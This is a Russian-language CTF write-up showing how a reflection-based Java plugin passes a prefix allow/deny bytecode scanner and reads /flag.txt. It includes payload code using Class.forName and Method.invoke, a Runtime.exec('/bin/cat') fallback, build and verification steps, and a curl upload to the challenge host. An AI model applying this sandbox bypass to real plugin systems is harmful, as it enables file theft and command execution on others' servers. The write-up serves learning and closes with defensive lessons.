# B2Bee — write-up (task6)

**Avito CTF 2026 · категория «Java sandbox escape»**
**Цель:** провести вредоносный Java-плагин через статическое ревью («ревью-пчела») и прочитать `/flag.txt`.
**Дано:** исходники сканера `PluginScanner.java` + `SandboxPolicy.java`; боевой хост `https://marketplugins-4qop8u5n.avitoctf.ru/`.

---

## 1. Разведка (что мы увидели и что это подсказало)

Сайт — «магазин плагинов скидок». Логика фронта (`app.js`, `site_index.html`) устроена так:

- есть каталог `GET /api/shop` и «тестовая корзина» — набор товаров, на котором прогоняется плагин;
- форма загрузки принимает `.jar`-файл (поле `plugin`) и имя точки входа (поле `entryClass`, по умолчанию `example.SeasonalDiscountPlugin`);
- сабмит уходит в `POST /api/plugins/run` (multipart), а ответ рендерится: при успехе поле `result.message` показывается в блоке **«Сообщение плагина»** внутри `<pre>`, при отказе — плашка **«JAR отправлен в карантин»** с `category` и `message` от сканера;
- рядом лежит `/examples/plugin-example.zip` — официальный SDK: `plugin-api-stubs.jar` (заглушки API) и `build-plugin.sh`, который собирает пример командой `javac --release 21 -XDstringConcat=inline`.

Ключевое наблюдение: **между загрузкой и запуском стоит статический сканер байткода** — та самая «ревью-пчела». Её исходники (`PluginScanner.java`, `SandboxPolicy.java`) выложены в открытую. Значит задача — не пробить рантайм, а **обмануть статический анализ**: собрать JAR, который сканер пропустит, но который в рантайме прочитает флаг.

Вывод разведки: раз у нас есть **точный код проверяющего**, надо разобрать его дословно и найти, что он *не* моделирует. Что не проверяется — то и есть путь эксплуатации.

---

## 2. Уязвимость (почему она существует)

`PluginScanner` — **чисто синтаксический** ASM-сканер. Он строит `ClassNode` (с `ClassReader.SKIP_DEBUG`) и смотрит ровно на:

- `node.superName` и `node.interfaces` — родитель и интерфейсы класса;
- у каждой инструкции — **только owner**: `MethodInsnNode.owner`, `FieldInsnNode.owner`, а для `TypeInsnNode` — `desc` при `NEW`/`ANEWARRAY`/`CHECKCAST`;
- константы `LDC` через `inspectConstant`.

`inspectConstant` блокирует лишь `ConstantDynamic`, `Handle` и `Type` сорта `METHOD`. **Обычные строковые `String`-константы игнорируются полностью.** А любой `InvokeDynamicInsnNode` баннится сразу и безусловно.

`SandboxPolicy.checkOwner` работает по префиксам:

```java
ALLOWED = { "java/lang", "java/util", "java/math", "java/time",
            "ru/avitoctf/marketplugins/api", "ru/avitoctf/marketplugins/model" };
DENIED  = { "java/lang/Runtime", "java/lang/Process", "java/lang/ProcessBuilder",
            "java/lang/ProcessHandle", "java/lang/System", "java/lang/Thread",
            "java/lang/ClassLoader", "java/lang/SecurityManager", "java/nio/file",
            "ru/avitoctf/marketplugins/sandbox", ".../service", ".../web" };
```

Порядок проверки в `checkOwner`: пустой owner → бан; `pluginOwners.contains(binaryName)` → пропуск; совпадение с `DENIED` (по `startsWith`) → бан; `if (!owner.contains("/")) return;` → пропуск; совпадение с `ALLOWED` → пропуск; иначе бан.

**Корневая дыра.** Аллоу-лист по грубому префиксу `"java/lang"` вайтлистит и `java/lang/Class`, и весь `java/lang/reflect/*`, а в `DENIED` их **нет**. Значит классическая рефлексия абсолютно легальна: `Class.forName(...)` имеет owner `java/lang/Class`, `Method.invoke(...)` — owner `java/lang/reflect/Method`, оба под разрешённым префиксом. При этом имена опасных классов (`"java.nio.file.Files"`, `"java.lang.Runtime"`) и путь `"/flag.txt"` — это **обычные строковые LDC**, которые сканер не смотрит. Потока данных он не моделирует: он физически не видит, что строка `"java.lang.Runtime"` утекает в `Class.forName`.

Полный список дыр политики:

1. Грубый префикс `ALLOWED "java/lang"` пропускает весь `java/lang/reflect/*` и `java/lang/Class`.
2. В `DENIED` нет ни `java/lang/Class`, ни `java/lang/reflect/*`.
3. `inspectConstant` не смотрит на обычные `String` — имена классов/методов/путей проходят невидимками.
4. Нет анализа потока данных — связь «строка → `Class.forName`» не отслеживается.
5. `if (!owner.contains("/")) return;` — авто-пропуск любого owner без слэша (дескрипторы примитивных массивов вроде `"[B"`, классы дефолтного пакета).
6. `pluginOwners.contains(binaryName)` — само-доверие к собственным классам плагина.

Единственная реальная защита — бан `INVOKEDYNAMIC` и `Handle`/`MethodType`/`ConstantDynamic`. Она не мешает рефлексии, а лишь запрещает лямбды, method-ref и `invokedynamic`-конкатенацию строк — это учтём при сборке.

---

## 3. Эксплуатация шаг за шагом

### 3.1. Идея пейлоада

Плагин реализует легальный интерфейс `ru.avitoctf.marketplugins.api.DiscountPlugin` (метод `PluginResult apply(PluginContext)`), а в теле **чистой рефлексией** читает флаг и кладёт его в `message` результата, который UI отрендерит в `<pre>`:

```java
public PluginResult apply(PluginContext context) throws Exception {
    String flag = grab();
    return new PluginResult(1337, 4242, flag); // message -> блок «Сообщение плагина»
}
```

`grab()` перебирает 5 путей-кандидатов (`/flag.txt`, `flag.txt`, `/flag`, `/app/flag.txt`, `/home/app/flag.txt`) тремя стратегиями чтения — на случай, если один способ закрыт. Все три написаны **только через рефлексию**, поэтому в байткоде фигурируют исключительно разрешённые owner'ы:

```java
// Стратегия 1: java.nio.file.Files.readAllBytes(Paths.get(path))
Class<?> paths = Class.forName("java.nio.file.Paths");   // owner java/lang/Class, аргумент — String-LDC
Class<?> pathType = Class.forName("java.nio.file.Path");
Class<?> files = Class.forName("java.nio.file.Files");
Object pathObj = paths.getMethod("get", String.class, String[].class)
                      .invoke(null, path, new String[0]);
Object bytes = files.getMethod("readAllBytes", pathType).invoke(null, pathObj);
return new String((byte[]) bytes);
```

Плюс стратегия 2 — рефлексивный `java.io.FileInputStream(path).readAllBytes()`, и стратегия 3 — рефлексивный `Runtime.getRuntime().exec({"/bin/cat", path})`. Все объекты, которые иначе притянули бы запрещённый owner (`java/io/*`, `java/nio/*`, `java/lang/Runtime`), держатся как `java.lang.Object` и трогаются только через `Method.invoke`.

Обход `java/nio/file` (в `DENIED`!) здесь наглядный: имя `"java.nio.file.Files"` — это строковый LDC, а не owner инструкции; фактический owner вызова — `java/lang/Class`. Пример дыры №5 тоже виден: `(byte[]) bytes` компилируется в `CHECKCAST` с desc `"[B"` — слэша нет, `checkOwner` авто-пропускает.

### 3.2. Обход бана invokedynamic

Современный `javac` (Java 9+) компилирует `"a" + b`, лямбды и method-ref в `invokedynamic` (`StringConcatFactory`/`LambdaMetafactory`), а сканер его баннит. Правила при написании пейлоада:

- ноль лямбд и method-ref;
- все строки собираются **явным `StringBuilder`**, никогда оператором `+`;
- сборка с флагом `-XDstringConcat=inline`, который убирает `invokedynamic`-конкатенацию даже там, где она проскочила бы.

### 3.3. Сборка и локальная верификация (`build.sh`)

Скрипт `task6/exploit/build.sh` собирает JAR и **прогоняет его через настоящий сканер** (те же `PluginScanner.java` + `SandboxPolicy.java` с боевого хоста), воспроизводя ровно то, что делает сервер:

```bash
cd task6/exploit && bash build.sh
```

Шаги внутри:

```
[1] javac --release 21 -XDstringConcat=inline -cp plugin-api-stubs.jar ...   # компиляция плагина
[2] jar cf seasonal-discount-plugin.jar ...                                  # упаковка;
    jar tf ... | grep '^ru/avitoctf/marketplugins/' -> LEAK                  # проверка: свои классы политики НЕ вложены
[3] javap -c -p example.SeasonalDiscountPlugin | grep invokedynamic          # ассерт: 0 invokedynamic
[4] javac ... PluginScanner.java SandboxPolicy.java + стабы + Verify.java     # компиляция РЕАЛЬНОГО сканера
[5] java Verify seasonal-discount-plugin.jar                                 # запуск scan() как на сервере
```

`harness/Verify.java` буквально повторяет серверный поток: открывает JAR, скармливает каждый `.class` в `PluginScanner.scan(...)` и печатает `SCAN PASSED`, если исключения не было. Результаты прогона:

- собранный JAR → **`RESULT: SCAN PASSED`** (ревью-пчела не срабатывает);
- `javap -c` → **0 invokedynamic**;
- негативный контроль: наивный плагин (прямой `Runtime` + `+`-конкатенация) → **`SCAN BLOCKED [blocked-direct-call] ❌ запрещённый API`** — значит харнесс реально ловит нарушения, а не пропускает всё подряд;
- end-to-end с подложенным фейковым `flag.txt` → `message=[nio /flag.txt] avitoctf{fake_local_flag}`.

Готовые артефакты: `task6/exploit/src/example/SeasonalDiscountPlugin.java`, JAR в `task6/exploit/build/dist/seasonal-discount-plugin.jar`, харнесс в `task6/exploit/harness/Verify.java`.

### 3.4. Загрузка на боевой хост

```bash
curl -s https://marketplugins-4qop8u5n.avitoctf.ru/api/plugins/run \
  -F "plugin=@task6/exploit/build/dist/seasonal-discount-plugin.jar;type=application/java-archive" \
  -F "entryClass=example.SeasonalDiscountPlugin" \
  -F 'cart={"title":"t","items":[{"title":"x","category":"y","price":100,"quantity":1}]}'
```

Флаг возвращается в `result.message` (то же поле, что UI показывает в `<pre>`). Важно: **корзина не должна быть пустой** — иначе фронт вернёт «Сначала добавьте товары в корзину», и плагин не запустится.

---

## 4. Флаг

```
avito{juSt_34Sy_biG_DISCoUNt}
```

Содержимое `/flag.txt`, полученное загрузкой плагина-эксплойта: JAR прошёл статический сканер, а в рантайме рефлексия прочитала файл и вернула его в `result.message`.

---

## 5. Отсылка для своих (Unicode-Tag стего)

В тексте одного из исключений `PluginScanner.java` (строка 106, ветка `ConstantDynamic`/`Handle`) спрятаны **невидимые Unicode-Tag символы** (`U+E01xx`, где `ASCII = codepoint − 0xE00F0`). Декодируются в:

```
good job, take your hidden flag: https://marketdone-cgttbdfl.avitoctf.ru/
```

Бонус-хост — пошаговый мета-квест (`step=2..6`, `want_flag=1`, эссе и т.п.) с агрессивным rate-limit; добивать вручную с паузами.

---

## 6. Выводы / уроки

- **Статический аллоу/деной-лист по префиксам owner'ов — это не песочница.** Рефлексия (`Class.forName` + `Method.invoke`) прячет любой класс за строкой и разрешённым owner'ом `java/lang/Class` / `java/lang/reflect/*`, а сканер без анализа потока данных этого не видит.
- **Грубые префиксы опасны:** `"java/lang"` тянет за собой `java/lang/reflect/*`; авто-пропуск owner'ов без слэша открывает дыру для дескрипторов массивов и дефолт-пакета.
- **Реальная методология решения:** взять исходник проверяющего → перечислить, что он *не* моделирует (строки, поток данных, рефлексия) → собрать пейлоад строго в рамках разрешённых owner'ов → **прогнать через тот же сканер локально** (`Verify.java`) до отправки на сервер, включая негативный контроль.
- **Как надо было изолировать:** отдельный процесс/JVM с seccomp, `ClassLoader` с фильтром классов и модульные границы, запрет рефлексии в песочнице — а не разбор байткода allow/deny-списком.
